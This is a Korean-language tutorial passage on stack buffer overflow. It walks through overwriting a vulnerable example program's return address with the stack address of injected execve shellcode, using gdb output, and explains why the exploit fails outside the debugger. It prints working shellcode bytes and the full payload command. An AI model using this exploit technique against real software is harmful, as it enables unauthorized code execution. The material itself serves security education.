RET Overwrite Exploitation :
    만들어진 셸코드를 example1 프로그램의 인자로 전달하면 셸코드가 스택 메모리에 저장됩니다.

    다음으로 vuln 함수의 리턴 주소를 스택에 저장된 셸코드의 주소로 바꾸어 보겠습니다.

    아래의 디버깅 결과를 보면 eip 레지스터의 값이 0x6a6a6a6a로 바뀌었고, 이는 argv[1]의 36 번째 오프셋이였습니다.
    ex)
        (gdb) disas vuln
        Dump of assembler code for function vuln:
            0x0804843b <+0>:	push   ebp
            0x0804843c <+1>:	mov    ebp,esp
            ...
            0x08048474 <+57>:	leave  
            0x08048475 <+58>:	ret   
        End of assembler dump.
        (gdb) b *0x8048475
        Breakpoint 1 at 0x8048475
        (gdb) r aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllll
        Starting program: ~/example1 aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllll
        
        Breakpoint 1, 0x08048475 in vuln ()
        (gdb) x/i $eip
        => 0x8048475 <vuln+58>:	ret    
        (gdb) x/wx $esp
        0xffffd5b0:	0x6a6a6a6a
        (gdb) 

    리턴 주소가 저장된 스택 메모리를 덮기까지 남은 36바이트의 위치에 셸코드를 위치시키고, 
    리턴 주소를 저장된 셸코드 주소로 바꾸는 공격 코드를 만들어 보겠습니다.

    셸코드의 주소를 확인하기 위해 argv[1]에 40 바이트 길이의 문자열을 넣어 example1 바이너리를 실행하고, 
    strcpy 함수를 호출하는 주소에 브레이크포인트를 설정해 디버깅해보겠습니다.
    
    ex) 셸코드 주소 확인
        (gdb) b *0x8048467
        Breakpoint 1 at 0x8048467
        (gdb) r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        Starting program: ~/example1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        
        Breakpoint 1, 0x08048467 in vuln ()
        (gdb) x/2wx $esp
        0xffffd4f4:	0xffffd4fc	0xffffd752
        (gdb) 

    셸코드의 길이는 23 바이트이므로 공격코드는 다음과 같이 구성됩니다.
    ex)
        셸코드 + 임의의 13바이트 + 0xffffd4fc
        "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80" + "\x90”*13 + “\xfc\xd4\xff\xff”

    이 공격 코드를 argv[1]에 넣어 프로그램을 실행해 보겠습니다.
    
    ex) 셸 실행하기
        $ gdb -q ./example1
        Reading symbols from ./example1...(no debugging symbols found)...done.
        (gdb) r python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80"+"A"*13+"\xfc\xd4\xff\xff"'
        Starting program: ~/example1 python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80"+"A"*13+"\xfc\xd4\xff\xff"'
        process 88433 is executing new program: /bin/dash
        $ id
        uid=1001(theori) gid=1001(theori) groups=1001(theori)

    리턴 주소가 셸코드 주소로 바뀌어 셸이 실행되는 것을 볼 수 있습니다.

    이제 만들어진 공격 코드를 gdb가 아닌 셸 환경에서 실행해 보겠습니다.
    ex)
        $ ./example1 python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80"+"A"*13+"\xfc\xd4\xff\xff"'
        [1]    88636 segmentation fault (core dumped)  ./example1 
        $ 

    셸을 획득하지 못 하고 프로그램이 비정상 종료되었습니다.

    위 익스플로잇 코드에서는 리턴 주소를 스택에 있는 셸코드의 주소로 덮습니다.
    하지만 익스플로잇이 제대로 동작하지 않은 이유는 스택의 셸코드의 주소가 바뀌었기 때문입니다.

    프로그램을 다른 환경에서 실행시킬 때 지역 변수의 주소는 스택 끝에 존재하는 프로그램의 인자와 환경변수에 따라 변합니다.

    본 예시의 gdb와 셸에서의 지역 변수 주소가 다른 이유는 argv[0] 문자열, 
    즉 실행 파일의 경로가 각각 절대 경로와 상대 경로로 다르기 때문입니다.

    ex)
        // binary.c
        #include <stdio.h>
        
        int main(int argc, char *argv[1]){
            printf("argv[0] : %s\n", argv[0]);
        }

    ex)
        $ ./binary
        argv[0] : ./binary
        
        $ gdb -q ./binary
        Reading symbols from ./binary...(no debugging symbols found)...done.
        (gdb) r
        Starting program: /Linux_Exploitation_Mitigation/binary 
        argv[0] : /Linux_Exploitation_Mitigation/binary
        [Inferior 1 (process 35158) exited normally]
        (gdb) 

    gdb는 프로그램을 실행할 때 실행 파일의 절대경로를 argv[0]에 저장하지만, 
    셸에서 프로그램을 실행할 때는 사용자가 입력한 경로가 argv[0]에 저장됩니다.

    그렇기 때문에 스택 주소에 약간의 오차가 생겨도 익스플로잇이 성공할 수 있도록 공격 코드를 수정할 필요가 있습니다.

    NOP Sled에서는 이러한 문제점을 해결하는 방법을 배울 수 있습니다.





















